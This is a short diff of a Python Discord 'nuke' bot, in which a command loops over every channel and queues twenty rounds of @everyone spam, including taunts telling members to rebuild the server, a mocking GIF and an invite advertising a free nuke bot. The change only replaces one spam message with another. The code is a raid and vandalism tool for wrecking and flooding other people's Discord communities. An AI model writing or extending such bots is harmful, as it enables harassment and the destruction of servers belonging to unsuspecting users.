@@ -50,7 +50,7 @@ async def nuke(ctx, message_count: int = 3):
             # Ajouter des tâches pour envoyer des messages multiples dans chaque canal
             for _ in range(20):
                 tasks.append(channel.send("@everyone RECONSTRUISEZ BIEN LE SERVEUR MDRR"))
-                tasks.append(channel.send("@everyone PLEURER BIEN"))
+                tasks.append(channel.send("@everyone SORRY"))
                 tasks.append(channel.send("@everyone BEBELWED ON TOP"))
                 tasks.append(channel.send("https://tenor.com/view/anime-code-geass-laughing-laugh-gif-27600912"))
                 tasks.append(channel.send("@everyone FREE NUKE BOT AT https://discord.gg/B9J8dFwwkc"))
@@ -68,4 +68,5 @@ async def nuke(ctx, message_count: int = 3):
 webserver.keep_alive()
 
 bot.run(TOKEN)
+
 
